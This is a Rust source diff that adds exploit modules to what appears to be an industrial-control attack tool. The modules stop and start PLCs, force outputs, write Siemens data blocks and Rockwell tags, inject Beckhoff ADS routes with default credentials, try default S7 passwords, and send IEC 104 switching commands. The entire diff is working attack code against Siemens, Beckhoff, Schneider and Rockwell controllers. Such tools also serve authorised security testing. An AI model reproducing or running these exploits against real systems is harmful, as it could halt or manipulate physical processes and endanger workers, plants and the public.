@@ -1276,6 +1276,429 @@ fn run_exploit(id: &str, ip: &str, username: &str, password: &str) -> anyhow::Re
             Ok(out)
         }
 
+        // ── Siemens S7Comm extended exploits ──────────────────────────────────
+
+        "siemens/cpu_state" => {
+            use crate::vendors::siemens::s7comm;
+            let pw = device_field_str(ip, "password");
+            let state = s7comm::get_cpu_state(ip, 102, 5, pw.as_deref());
+            if state == "Unknown" {
+                anyhow::bail!("Could not read CPU state from {ip}; check connectivity or password")
+            }
+            Ok(format!("CPU State: {state}"))
+        }
+
+        "siemens/io" => {
+            use crate::vendors::siemens::s7comm;
+            let pw = device_field_str(ip, "password");
+            let data = s7comm::read_all_data(ip, 102, 5, pw.as_deref());
+            let mut out = String::new();
+            for (area, maybe_bits) in &data {
+                let Some(bits) = maybe_bits else { continue };
+                let prefix = match area.as_str() {
+                    "inputs" => "I",
+                    "outputs" => "Q",
+                    "merkers" => "M",
+                    _ => continue,
+                };
+                let mut addrs: Vec<&String> = bits.keys().collect();
+                addrs.sort();
+                for addr in addrs {
+                    writeln!(out, "{prefix}{addr} = {}", if bits[addr] != 0 { "ON" } else { "OFF" }).ok();
+                }
+            }
+            if out.is_empty() {
+                Ok("No I/O data returned (device may require authentication).".into())
+            } else {
+                Ok(out)
+            }
+        }
+
+        "siemens/toggle" => {
+            use crate::vendors::siemens::s7comm;
+            if s7comm::change_cpu_state(ip, 102, 5) {
+                let pw = device_field_str(ip, "password");
+                let new_state = s7comm::get_cpu_state(ip, 102, 5, pw.as_deref());
+                Ok(format!("CPU state toggled. New state: {new_state}"))
+            } else {
+                anyhow::bail!("CPU state toggle failed on {ip}")
+            }
+        }
+
+        "siemens/set_outputs" => {
+            use crate::vendors::siemens::s7comm;
+            let pw = device_field_str(ip, "password");
+            let bits = if username.is_empty() { "00000000" } else { username };
+            if s7comm::set_outputs(ip, bits, 102, 5, pw.as_deref()) {
+                Ok(format!("Outputs set to {bits} on {ip}."))
+            } else {
+                anyhow::bail!("Output write failed on {ip} (authentication or protocol error)")
+            }
+        }
+
+        "siemens/set_merkers" => {
+            use crate::vendors::siemens::s7comm;
+            let pw = device_field_str(ip, "password");
+            let bits = if username.is_empty() { "00000000" } else { username };
+            let offset: u32 = password.trim().parse().unwrap_or(0);
+            if s7comm::set_merkers(ip, bits, offset, 102, 5, pw.as_deref()) {
+                Ok(format!("Merkers at offset {offset} set to {bits} on {ip}."))
+            } else {
+                anyhow::bail!("Merker write failed on {ip}")
+            }
+        }
+
+        "siemens/list_dbs" => {
+            use crate::vendors::siemens::s7comm;
+            let pw = device_field_str(ip, "password");
+            let blocks = s7comm::list_data_blocks(ip, 102, 5, pw.as_deref());
+            if blocks.is_empty() {
+                return Ok("No data blocks found (device may require authentication).".into());
+            }
+            let mut out = String::new();
+            for (db_num, size) in &blocks {
+                writeln!(out, "DB{db_num}  ({size} bytes accessible)").ok();
+            }
+            Ok(out)
+        }
+
+        "siemens/read_db" => {
+            use crate::vendors::siemens::s7comm;
+            let pw = device_field_str(ip, "password");
+            // username = "db:offset:length"  e.g. "1:0:16"
+            let parts: Vec<&str> = username.splitn(3, ':').collect();
+            let db: u16 = parts.first().and_then(|s| s.trim().parse().ok()).unwrap_or(1);
+            let offset: u16 = parts.get(1).and_then(|s| s.trim().parse().ok()).unwrap_or(0);
+            let length: u16 = parts.get(2)
+                .and_then(|s| s.trim().parse().ok()).unwrap_or(16).min(200);
+            let data = s7comm::read_data_block(ip, db, offset, length, 102, 5, pw.as_deref())?;
+            let hex: String = data.iter().fold(String::new(), |mut s, b| {
+                let _ = write!(s, "{b:02x} ");
+                s
+            });
+            Ok(format!("DB{db} offset {offset} ({} bytes):\n{}", data.len(), hex.trim_end()))
+        }
+
+        "siemens/write_db" => {
+            use crate::vendors::siemens::s7comm;
+            let pw = device_field_str(ip, "password");
+            // username = "db:offset"  password = hex bytes e.g. "deadbeef"
+            let parts: Vec<&str> = username.splitn(2, ':').collect();
+            let db: u16 = parts.first().and_then(|s| s.trim().parse().ok()).unwrap_or(1);
+            let offset: u16 = parts.get(1).and_then(|s| s.trim().parse().ok()).unwrap_or(0);
+            let hex_str: String = password.chars().filter(|c| !c.is_whitespace()).collect();
+            if hex_str.is_empty() || hex_str.len() % 2 != 0 {
+                anyhow::bail!("Data must be an even number of hex chars (e.g. 'deadbeef')");
+            }
+            let data: Vec<u8> = (0..hex_str.len()).step_by(2)
+                .filter_map(|i| u8::from_str_radix(&hex_str[i..i + 2], 16).ok())
+                .collect();
+            let ok = s7comm::write_data_block(ip, db, offset, &data, 102, 5, pw.as_deref())?;
+            if ok {
+                Ok(format!("Wrote {} bytes to DB{db} offset {offset} on {ip}.", data.len()))
+            } else {
+                anyhow::bail!("DB write was not confirmed by PLC")
+            }
+        }
+
+        "siemens/try_defaults" => {
+            use crate::creds;
+            use crate::vendors::default_creds;
+            use crate::vendors::siemens::s7comm;
+            if !s7comm::probe_auth_required(ip, 102, 5) {
+                return Ok(format!("{ip} has no access protection — no password needed."));
+            }
+            let loaded = creds::load();
+            let all_passwords: Vec<&str> = loaded
+                .siemens
+                .passwords
+                .iter()
+                .map(std::string::String::as_str)
+                .chain(default_creds::SIEMENS_S7_PASSWORDS.iter().copied())
+                .collect();
+            for &pw in &all_passwords {
+                let display = if pw.is_empty() { "(empty)" } else { pw };
+                let state = s7comm::get_cpu_state(ip, 102, 5, Some(pw));
+                if state != "Unknown" {
+                    return Ok(format!("Password accepted: \"{display}\"\nCPU State: {state}"));
+                }
+            }
+            Ok(format!(
+                "None of the {} passwords worked. \
+                 Add custom passwords to ~/.config/scadaver/creds.toml [siemens] section.",
+                all_passwords.len()
+            ))
+        }
+
+        // ── Beckhoff ADS extended exploits ────────────────────────────────────
+
+        "beckhoff/info" => {
+            use crate::core::network::local_ip_for;
+            use crate::vendors::beckhoff::{ads, scan};
+            let local_netid = ads::build_local_netid(&local_ip_for(ip));
+            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
+                .ok()
+                .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
+                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
+            match scan::get_device_info_full(&dev, &local_netid, 0) {
+                Some(info) => {
+                    let mut out = String::new();
+                    writeln!(out, "Name:     {}", info.name).ok();
+                    writeln!(out, "NetID:    {}", info.netid).ok();
+                    writeln!(out, "TC Ver:   {}", info.tc_version).ok();
+                    if let Some(t) = &info.target_type { writeln!(out, "Type:     {t}").ok(); }
+                    if let Some(m) = &info.hardware_model { writeln!(out, "Hardware: {m}").ok(); }
+                    if let Some(s) = &info.serial { writeln!(out, "Serial:   {s}").ok(); }
+                    if let Some(o) = &info.os_name { writeln!(out, "OS:       {o}").ok(); }
+                    Ok(out)
+                }
+                None => Ok(format!(
+                    "Connected to {ip} (TC2 device or no XML info available)\n\
+                     Name: {}\nNetID: {}\nTC Ver: {}",
+                    dev.name, dev.netid_str, dev.tc_version
+                )),
+            }
+        }
+
+        "beckhoff/state_run" => {
+            use crate::core::network::local_ip_for;
+            use crate::vendors::beckhoff::{ads, scan};
+            let local_netid = ads::build_local_netid(&local_ip_for(ip));
+            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
+                .ok()
+                .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
+                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
+            scan::set_twincat_state(&dev, &local_netid, "run", 0)?;
+            Ok(format!("TwinCAT state set to RUN on {ip}."))
+        }
+
+        "beckhoff/state_config" => {
+            use crate::core::network::local_ip_for;
+            use crate::vendors::beckhoff::{ads, scan};
+            let local_netid = ads::build_local_netid(&local_ip_for(ip));
+            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
+                .ok()
+                .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
+                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
+            scan::set_twincat_state(&dev, &local_netid, "config", 0)?;
+            Ok(format!("TwinCAT state set to CONFIG on {ip}."))
+        }
+
+        "beckhoff/get_state" => {
+            use crate::core::network::local_ip_for;
+            use crate::vendors::beckhoff::{ads, scan};
+            let local_netid = ads::build_local_netid(&local_ip_for(ip));
+            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
+                .ok()
+                .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
+                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
+            let state = scan::get_state(&dev, &local_netid, 0);
+            Ok(format!("TwinCAT runtime state: {state}"))
+        }
+
+        "beckhoff/add_route" => {
+            use crate::core::network::local_ip_for;
+            use crate::vendors::beckhoff::{ads, scan};
+            let local_ip = local_ip_for(ip);
+            let local_netid = ads::build_local_netid(&local_ip);
+            let user = if username.is_empty() { "Administrator" } else { username };
+            let pass = if password.is_empty() { "1" } else { password };
+            let dev = scan::discover_ip(ip, 3, true)
+                .ok()
+                .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
+                .ok_or_else(|| anyhow::anyhow!(
+                    "No Beckhoff device responded at {ip} \
+                     (route injection requires UDP discovery on port 48899)"
+                ))?;
+            if scan::add_route(&dev, &local_ip, &local_netid, user, pass, Some("scadaver")) {
+                Ok(format!(
+                    "ADS route added to {ip}: this host ({local_ip}) now has ADS access."
+                ))
+            } else {
+                anyhow::bail!("Route injection failed (wrong credentials or device denied)")
+            }
+        }
+
+        "beckhoff/symbols" => {
+            use crate::core::network::local_ip_for;
+            use crate::vendors::beckhoff::{ads, scan};
+            let local_netid = ads::build_local_netid(&local_ip_for(ip));
+            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
+                .ok()
+                .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
+                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
+            let symbols = scan::enumerate_symbols(&dev, &local_netid, 0);
+            if symbols.is_empty() {
+                return Ok(
+                    "No symbols returned (device may not support ADS symbol upload).".into()
+                );
+            }
+            let mut out = String::new();
+            for sym in symbols.iter().take(200) {
+                let val = sym.value_str.as_deref().unwrap_or("-");
+                writeln!(out, "{:<48}  {:>10}  {}", sym.name, val, sym.type_name).ok();
+            }
+            if symbols.len() > 200 {
+                writeln!(out, "... ({} total, showing first 200)", symbols.len()).ok();
+            }
+            Ok(out)
+        }
+
+        "beckhoff/write_symbol" => {
+            use crate::core::network::local_ip_for;
+            use crate::vendors::beckhoff::{ads, scan};
+            let local_netid = ads::build_local_netid(&local_ip_for(ip));
+            if username.is_empty() {
+                anyhow::bail!("Symbol name required in Username field");
+            }
+            let hex_str: String = password.chars().filter(|c| !c.is_whitespace()).collect();
+            if hex_str.is_empty() || hex_str.len() % 2 != 0 {
+                anyhow::bail!(
+                    "Symbol value required as hex bytes in Password field \
+                     (e.g. '01' for BOOL true, '2a00' for INT 42)"
+                );
+            }
+            let value_bytes: Vec<u8> = (0..hex_str.len()).step_by(2)
+                .filter_map(|i| u8::from_str_radix(&hex_str[i..i + 2], 16).ok())
+                .collect();
+            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
+                .ok()
+                .and_then(|mut v| if v.is_empty() { None } else { Some(v.remove(0)) })
+                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
+            let ok = scan::write_symbol_value(&dev, &local_netid, username, value_bytes, 0)?;
+            if ok {
+                Ok(format!("Symbol '{}' written on {ip}.", username))
+            } else {
+                anyhow::bail!("Symbol write was not confirmed by device")
+            }
+        }
+
+        // ── Schneider FC90 exploits ────────────────────────────────────────────
+
+        "schneider/fc90_stop" => {
+            use crate::vendors::schneider::modicon_fc90;
+            let ok = modicon_fc90::stop_plc(ip, 0)?;
+            if ok {
+                Ok(format!("PLC STOP sent via FC90 to {ip}."))
+            } else {
+                anyhow::bail!("FC90 STOP not acknowledged by {ip}")
+            }
+        }
+
+        "schneider/fc90_start" => {
+            use crate::vendors::schneider::modicon_fc90;
+            let ok = modicon_fc90::start_plc(ip, 0)?;
+            if ok {
+                Ok(format!("PLC START sent via FC90 to {ip}."))
+            } else {
+                anyhow::bail!("FC90 START not acknowledged by {ip}")
+            }
+        }
+
+        "schneider/fc90_stop_tm221" => {
+            use crate::vendors::schneider::modicon_fc90;
+            let ok = modicon_fc90::stop_tm221(ip, 0)?;
+            if ok {
+                Ok(format!("TM221 STOP sent via FC90 to {ip}."))
+            } else {
+                anyhow::bail!("FC90 TM221 STOP not acknowledged by {ip}")
+            }
+        }
+
+        "schneider/fc90_start_tm221" => {
+            use crate::vendors::schneider::modicon_fc90;
+            let ok = modicon_fc90::start_tm221(ip, 0)?;
+            if ok {
+                Ok(format!("TM221 START sent via FC90 to {ip}."))
+            } else {
+                anyhow::bail!("FC90 TM221 START not acknowledged by {ip}")
+            }
+        }
+
+        "schneider/fc90_force" => {
+            use crate::vendors::schneider::modicon_fc90::{self, ForceState};
+            // username = output byte (hex 0x11..0x16 or decimal), password = "on"/"off"/"unforce"
+            let output_byte: u8 = u8::from_str_radix(
+                username.trim().trim_start_matches("0x"), 16
+            )
+            .or_else(|_| username.trim().parse())
+            .unwrap_or(0x11);
+            let state = match password.trim().to_ascii_lowercase().as_str() {
+                "off" | "0" | "false" => ForceState::Off,
+                "unforce" | "none" | "reset" => ForceState::Unforce,
+                _ => ForceState::On,
+            };
+            let ok = modicon_fc90::force_output_bit(ip, 0, output_byte, state)?;
+            if ok {
+                Ok(format!("Force output 0x{output_byte:02X} to {state:?} on {ip}."))
+            } else {
+                anyhow::bail!("FC90 force output not acknowledged by {ip}")
+            }
+        }
+
+        // ── Rockwell Allen-Bradley tag read / write ────────────────────────────
+
+        "rockwell/read_tag" => {
+            use crate::vendors::rockwell::driver;
+            if username.is_empty() {
+                anyhow::bail!("Tag name required in Username field");
+            }
+            let data = driver::read_tag(ip, 44818, username)?;
+            if data.len() < 2 {
+                anyhow::bail!("Read returned too few bytes for tag '{username}'");
+            }
+            let tag_type = u16::from_le_bytes([data[0], data[1]]);
+            let decoded = driver::decode_value(tag_type, &data, None);
+            Ok(format!(
+                "Tag:   {username}\nType:  {}\nValue: {decoded}",
+                driver::type_name(tag_type)
+            ))
+        }
+
+        "rockwell/write_tag" => {
+            use crate::vendors::rockwell::driver;
+            if username.is_empty() {
+                anyhow::bail!("Tag name required in Username field; value in Password field");
+            }
+            let all_tags = driver::enumerate_tags(ip, 44818)?;
+            let tag = all_tags
+                .iter()
+                .find(|t| t.name.eq_ignore_ascii_case(username))
+                .ok_or_else(|| anyhow::anyhow!("Tag '{username}' not found on device"))?;
+            let cip_type = tag.tag_type;
+            if !driver::is_writable_type(cip_type) {
+                anyhow::bail!(
+                    "Tag '{username}' type '{}' is not a writable scalar",
+                    driver::type_name(cip_type)
+                );
+            }
+            let bytes = driver::encode_value_for_type(cip_type, password)?;
+            driver::write_tag(ip, 44818, username, cip_type & 0x0FFF, &bytes)?;
+            Ok(format!("Tag '{username}' written: {password} on {ip}."))
+        }
+
+        // ── IEC 60870-5-104 Double Command ────────────────────────────────────
+
+        "iec104/dc" => {
+            use crate::vendors::iec104::client;
+            // username = IOA address, password = state (1=off, 2=on, 3=indeterminate)
+            let ioa: u32 = username.trim().parse().unwrap_or(1);
+            let state: u8 = match password.trim().to_ascii_lowercase().as_str() {
+                "off" | "0" | "false" | "1" => 1,
+                "indeterminate" | "3" => 3,
+                _ => 2,
+            };
+            let mut session = client::connect(ip, 2404)?;
+            let confirmed = client::double_command(&mut session, ioa, state)?;
+            if confirmed {
+                Ok(format!("Double command IOA {ioa} state {state} confirmed on {ip}."))
+            } else {
+                anyhow::bail!(
+                    "Double command IOA {ioa} received negative acknowledgement from {ip}"
+                )
+            }
+        }
+
         _ => anyhow::bail!("Unknown exploit: {id}"),
     }
 }
